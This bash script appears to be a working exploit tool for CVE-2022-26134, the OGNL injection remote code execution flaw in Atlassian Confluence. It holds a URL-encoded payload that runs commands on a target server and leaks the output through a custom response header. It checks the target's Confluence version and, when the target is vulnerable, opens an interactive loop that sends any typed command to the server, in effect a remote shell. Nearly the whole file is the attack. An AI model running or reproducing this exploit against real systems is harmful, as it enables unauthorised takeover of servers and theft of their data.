#!/bin/bash
#### Colors Output

RESET="\033[0m"			# Normal Colour
RED="\033[0;31m" 		# Error / Issues
GREEN="\033[0;32m"		# Successful       
BOLD="\033[01;01m"    	# Highlight
WHITE="\033[1;37m"		# BOLD
YELLOW="\033[1;33m"		# Warning
PADDING="  "
DPADDING="\t\t"


#### Other Colors / Status Code

LGRAY="\033[0;37m"		# Light Gray
LRED="\033[1;31m"		# Light Red
LGREEN="\033[1;32m"		# Light GREEN
LBLUE="\033[1;34m"		# Light Blue
LPURPLE="\033[1;35m"	# Light Purple
LCYAN="\033[1;36m"		# Light Cyan
SORANGE="\033[0;33m"	# Standar Orange
SBLUE="\033[0;34m"		# Standar Blue
SPURPLE="\033[0;35m"	# Standar Purple      
SCYAN="\033[0;36m"		# Standar Cyan
DGRAY="\033[1;30m"		# Dark Gray

Banner(){
    clear
cat << "EOF"
   ___       __  _____        
  / _ )___  / /_/ ___/__  ___ 
 / _  / _ \/ __/ /__/ _ \/ _ \
/____/\___/\__/\___/\___/_//_/ v1.2

        CVE-2022-26134
            evl.nu

EOF
}
Banner

## Variable
EXPLOIT_PAYLOAD="/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22x-evl-nu%22%2C%23a%29%29%7D/"

    echo -ne "[!] Starting using ${SBLUE}single${RESET} methode\n"
    echo -ne "[+] Input Target : "
    read singleTargetList

    ## RCE Exploitation
    echo "-------------------------------------------"
    
    for exploitRCE in $(echo ${singleTargetList}); do
        timeStamp=$(date '+%A %W %Y %X')
        runExploit=$(curl -m 15 -Lisk "${exploitRCE}${EXPLOIT_PAYLOAD}" | grep 'x-evl-nu:' | sed 's/x-evl-nu: //g')
        runCheckVersion=$(curl -m 15 -Lisk "${exploitRCE}" | grep "Printed by Atlassian Confluence " | sed 's/            <li class="print-only">//g' | sed 's/<\/li>//g' | cut -d " " -f 5)
        if [[ ${runExploit} =~ "uid=" ]]; then
            echo -ne "[${SBLUE}${timeStamp}${RESET}] ┌[${LBLUE}Attlasian Confluence Version ${runCheckVersion}${RESET}]\n"
            echo -ne "[${SBLUE}${timeStamp}${RESET}] ├[${LGREEN}VULNERABLE${RESET}] - ${exploitRCE} - ${SORANGE}${runExploit}${RESET}\n"

            ## Dynamic Command
            echo -ne "[${SBLUE}${timeStamp}${RESET}] └[${LBLUE}INFO${RESET}] Trying to use Dynamic Command\n"
            while true; do
                echo -ne "[${SBLUE}${timeStamp}${RESET}]───[${LGREEN}\$${RESET}] "
                read dynamicCommand
                CUSTOM_PAYLOAD="/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22$(echo "${dynamicCommand}"|sed 's/ /%20/g')%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22x-evl-nu%22%2C%23a%29%29%7D/"
                exploitShell=$(curl -m 15 -Lisk "${exploitRCE}${CUSTOM_PAYLOAD}" | grep 'x-evl-nu:' | sed 's/x-evl-nu: //g')
                echo "${exploitShell}"
            done
        else
            echo -ne "[${SBLUE}${timeStamp}${RESET}] ┌[${LBLUE}Attlasian Confluence Version ${runCheckVersion}${RESET}]\n"
            echo -ne "[${SBLUE}${timeStamp}${RESET}] └[${LRED}NOT VULN${RESET}] - ${exploitRCE}\n"
        fi
    done